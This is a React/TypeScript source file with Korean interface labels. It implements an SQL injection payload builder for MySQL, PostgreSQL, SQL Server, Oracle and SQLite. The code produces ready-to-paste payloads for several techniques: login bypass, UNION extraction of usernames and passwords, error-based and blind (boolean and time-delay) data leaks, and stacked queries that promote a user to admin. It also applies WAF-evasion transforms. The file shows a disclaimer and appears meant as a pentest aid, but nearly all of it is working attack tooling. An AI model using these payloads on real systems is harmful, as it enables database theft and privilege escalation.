import { useState } from 'react'
import { DISCLAIMER, Note, Pick, TextInput, Readout, urlEncodeAll } from './shared'

/* ── DBMS 별 함수 방언 ─────────────────────────────────────────── */
type Dbms = {
  id: string
  label: string
  version: string
  user: string
  db: string
  /** 문자열 이어붙이기 */
  concat: (parts: string[]) => string
  /** N초 지연 (블라인드-시간) */
  sleep: (sec: number) => string
  /** 조건부 지연: cond 가 참일 때만 지연 */
  condSleep: (cond: string, sec: number) => string
  /** 에러-기반: sub 표현식을 에러 메시지로 노출 */
  errorBased: (sub: string) => string
  /** 스태킹 쿼리 구분자 지원 여부 */
  stacking: boolean
  comment: string
}

const DBMS_LIST: Dbms[] = [
  {
    id: 'mysql', label: 'MySQL / MariaDB',
    version: '@@version', user: 'current_user()', db: 'database()',
    concat: p => `CONCAT(${p.join(',0x7e,')})`,
    sleep: s => `SLEEP(${s})`,
    condSleep: (c, s) => `IF((${c}),SLEEP(${s}),0)`,
    errorBased: sub => `AND EXTRACTVALUE(1,CONCAT(0x7e,(${sub})))`,
    stacking: false, comment: '-- -',
  },
  {
    id: 'postgres', label: 'PostgreSQL',
    version: 'version()', user: 'current_user', db: 'current_database()',
    concat: p => p.join("||'~'||"),
    sleep: s => `pg_sleep(${s})`,
    condSleep: (c, s) => `(SELECT CASE WHEN (${c}) THEN pg_sleep(${s}) ELSE pg_sleep(0) END)`,
    errorBased: sub => `AND 1=CAST((${sub}) AS INT)`,
    stacking: true, comment: '-- -',
  },
  {
    id: 'mssql', label: 'MS SQL Server',
    version: '@@version', user: 'SYSTEM_USER', db: 'DB_NAME()',
    concat: p => p.join("+'~'+"),
    sleep: s => `WAITFOR DELAY '0:0:${s}'`,
    condSleep: (c, s) => `IF(${c}) WAITFOR DELAY '0:0:${s}'`,
    errorBased: sub => `AND 1=CONVERT(INT,(${sub}))`,
    stacking: true, comment: '-- -',
  },
  {
    id: 'oracle', label: 'Oracle',
    version: "(SELECT banner FROM v$version WHERE ROWNUM=1)", user: 'USER', db: "(SELECT global_name FROM global_name)",
    concat: p => p.join("||'~'||"),
    sleep: s => `DBMS_PIPE.RECEIVE_MESSAGE('a',${s})`,
    condSleep: (c, s) => `(SELECT CASE WHEN (${c}) THEN DBMS_PIPE.RECEIVE_MESSAGE('a',${s}) ELSE 0 END FROM dual)`,
    errorBased: sub => `AND 1=CTXSYS.DRITHSX.SN(1,(${sub}))`,
    stacking: false, comment: '-- -',
  },
  {
    id: 'sqlite', label: 'SQLite',
    version: 'sqlite_version()', user: "'n/a'", db: "'main'",
    concat: p => p.join("||'~'||"),
    sleep: () => `1` /* SQLite 는 지연 함수 없음 — RANDOMBLOB 부하로 대체 */,
    condSleep: (c) => `CASE WHEN (${c}) THEN (SELECT 1 FROM (SELECT randomblob(100000000)) ) ELSE 0 END`,
    errorBased: sub => `AND 1=(SELECT ${sub})`,
    stacking: true, comment: '-- -',
  },
]

/* ── 삽입 컨텍스트: 페이로드 앞에서 원본 리터럴을 닫는 방법 ────────── */
const CTX = [
  { id: 'str-sq', label: "문자열 — 작은따옴표  WHERE x='…'", close: "'" },
  { id: 'str-dq', label: '문자열 — 큰따옴표  WHERE x="…"', close: '"' },
  { id: 'num', label: '숫자 — 따옴표 없음  WHERE id=…', close: '' },
  { id: 'str-paren', label: "문자열 + 괄호  WHERE x=('…')", close: "')" },
  { id: 'num-paren', label: '숫자 + 괄호  WHERE id=(…)', close: ')' },
  { id: 'like', label: "LIKE 절  LIKE '%…%'", close: "%'" },
  { id: 'order', label: 'ORDER BY 절 (숫자/식만 허용)', close: '' },
]

const TECHNIQUES = [
  { id: 'auth', label: '인증 우회 (항상 참 조건)' },
  { id: 'union', label: 'UNION 기반 — 데이터 추출' },
  { id: 'error', label: '에러 기반 — 메시지로 유출' },
  { id: 'boolean', label: '블라인드 — 불리언(참/거짓)' },
  { id: 'time', label: '블라인드 — 시간 지연' },
  { id: 'stack', label: '스태킹 쿼리 (상태 변경)' },
  { id: 'orderby', label: 'ORDER BY 컬럼 수 핑거프린트' },
]

const COMMENTS = [
  { id: 'dash', label: '-- - (하이픈, 안전한 공백)', v: '-- -' },
  { id: 'hash', label: '# (MySQL)', v: '#' },
  { id: 'inline', label: '/**/ (인라인, 개행 없음)', v: '/**/' },
  { id: 'null', label: ';%00 (널바이트)', v: ';%00' },
  { id: 'none', label: '없음 (뒤에 균형 맞춤)', v: '' },
]

const WAF = [
  { id: 'none', label: '없음' },
  { id: 'case', label: '키워드 대소문자 섞기 (SeLeCt)' },
  { id: 'inlinecmt', label: '키워드 사이 /**/ 삽입' },
  { id: 'mysqlver', label: 'MySQL 버전 주석 /*!50000SELECT*/' },
  { id: 'space-comment', label: '공백 → /**/ 치환' },
  { id: 'space-paren', label: '공백 → 괄호/개행 치환' },
  { id: 'urlenc', label: '전체 URL 인코딩' },
]

function applyWaf(s: string, id: string): string {
  switch (id) {
    case 'case': return s.replace(/\b(SELECT|UNION|FROM|WHERE|AND|OR|SLEEP|CONCAT|CASE|WHEN|THEN|ELSE|END|NULL|ORDER|BY)\b/gi,
      w => w.split('').map((ch, i) => i % 2 ? ch.toLowerCase() : ch.toUpperCase()).join(''))
    case 'inlinecmt': return s.replace(/\b(SELECT|UNION|FROM|WHERE|AND|OR)\b/gi, w => w.split('').join('/**/'))
    case 'mysqlver': return s.replace(/\b(SELECT|UNION|FROM|WHERE|AND|OR)\b/gi, w => `/*!50000${w}*/`)
    case 'space-comment': return s.replace(/ /g, '/**/')
    case 'space-paren': return s.replace(/ /g, '%0A')
    case 'urlenc': return urlEncodeAll(s)
    default: return s
  }
}

export function SqliPayloadBuilder() {
  const [dbmsId, setDbmsId] = useState('mysql')
  const [ctxId, setCtxId] = useState('str-sq')
  const [techId, setTechId] = useState('union')
  const [commentId, setCommentId] = useState('dash')
  const [wafId, setWafId] = useState('none')
  const [cols, setCols] = useState('3')
  const [markCol, setMarkCol] = useState('2')
  const [table, setTable] = useState('users')
  const [colList, setColList] = useState('username,password')
  const [predicate, setPredicate] = useState("SUBSTRING((SELECT password FROM users LIMIT 1),1,1)='a'")
  const [sec, setSec] = useState('5')
  const [stackSql, setStackSql] = useState("UPDATE users SET role='admin' WHERE id=1")

  const dbms = DBMS_LIST.find(d => d.id === dbmsId)!
  const ctx = CTX.find(c => c.id === ctxId)!
  const comment = COMMENTS.find(c => c.id === commentId)!.v
  const n = Math.max(1, parseInt(cols) || 1)
  const nullList = Array.from({ length: n }, () => 'NULL')
  const extractExpr = dbms.concat(colList.split(',').map(c => c.trim()).filter(Boolean).map(c => `${c}`))

  let core: string
  switch (techId) {
    case 'auth':
      core = `${ctx.close} OR 1=1`
      break
    case 'union': {
      const sel = [...nullList]
      const mi = Math.min(Math.max(1, parseInt(markCol) || 1), n) - 1
      sel[mi] = `(SELECT ${extractExpr} FROM ${table})`
      core = `${ctx.close} UNION SELECT ${sel.join(',')}`
      break
    }
    case 'error':
      core = `${ctx.close} ${dbms.errorBased(extractExpr)}`
      break
    case 'boolean':
      core = `${ctx.close} AND (${predicate})`
      break
    case 'time':
      core = `${ctx.close} AND ${dbms.condSleep(predicate, Math.max(1, parseInt(sec) || 5))}`
      break
    case 'stack':
      core = `${ctx.close}; ${stackSql}`
      break
    case 'orderby':
      core = `${ctx.close.replace(/[)'"%]+$/, '') || ''} ORDER BY ${n}`.trim()
      break
    default:
      core = ctx.close
  }

  let payload = comment ? `${core}${comment.startsWith(';') ? '' : ' '}${comment}` : core
  payload = applyWaf(payload, wafId)

  const notes: string[] = []
  if (techId === 'union') notes.push(`컬럼 수(${n})가 맞아야 UNION 이 성공합니다. 먼저 ORDER BY 핑거프린트로 확인하세요.`)
  if (techId === 'stack' && !dbms.stacking) notes.push(`${dbms.label} 는 일반적으로 다중 구문(스태킹)을 지원하지 않습니다 — 드라이버 설정에 따라 다름.`)
  if (techId === 'time' && dbms.id === 'sqlite') notes.push('SQLite 는 지연 함수가 없어 randomblob 부하로 대체했습니다 — 반응이 느릴 수 있습니다.')

  return <div className="payload-builder">
    <Note>{DISCLAIMER}</Note>

    <Pick label="대상 DBMS" value={dbmsId} onChange={setDbmsId} options={DBMS_LIST.map(d => ({ id: d.id, label: d.label }))}/>
    <Pick label="삽입 컨텍스트 (원본 리터럴)" value={ctxId} onChange={setCtxId} options={CTX.map(c => ({ id: c.id, label: c.label }))}/>
    <Pick label="기법" value={techId} onChange={setTechId} options={TECHNIQUES.map(t => ({ id: t.id, label: t.label }))}/>

    {techId === 'union' && <>
      <TextInput label="컬럼 수" value={cols} onChange={setCols} placeholder="3"/>
      <TextInput label="출력에 보이는 컬럼 위치" value={markCol} onChange={setMarkCol} placeholder="2"/>
      <TextInput label="추출 대상 테이블" value={table} onChange={setTable} placeholder="users"/>
      <TextInput label="추출 컬럼 (쉼표)" value={colList} onChange={setColList} placeholder="username,password"/>
    </>}
    {techId === 'error' && <>
      <TextInput label="추출 컬럼 (쉼표)" value={colList} onChange={setColList} placeholder="username,password"/>
      <TextInput label="테이블" value={table} onChange={setTable} placeholder="users"/>
    </>}
    {(techId === 'boolean' || techId === 'time') && <TextInput label="참/거짓 판별식 (predicate)" value={predicate} onChange={setPredicate} placeholder="SUBSTRING((SELECT ...),1,1)='a'"/>}
    {techId === 'time' && <TextInput label="지연 시간(초)" value={sec} onChange={setSec} placeholder="5"/>}
    {techId === 'stack' && <TextInput label="이어붙일 SQL" value={stackSql} onChange={setStackSql} placeholder="UPDATE users SET role='admin' WHERE id=1"/>}

    <Pick label="주석 처리" value={commentId} onChange={setCommentId} options={COMMENTS.map(c => ({ id: c.id, label: c.label }))}/>
    <Pick label="WAF 우회" value={wafId} onChange={setWafId} options={WAF.map(w => ({ id: w.id, label: w.label }))}/>

    {notes.map((t, i) => <p className="payload-builder-hint" key={i}>{t}</p>)}

    <div className="payload-readout-group">
      <Readout title="페이로드 (파라미터 값에 대입)" value={payload} wrap="anywhere"/>
      <Readout title="정보 함수 참고" value={`version: ${dbms.version}\nuser: ${dbms.user}\ncurrent db: ${dbms.db}`}/>
    </div>
  </div>
}
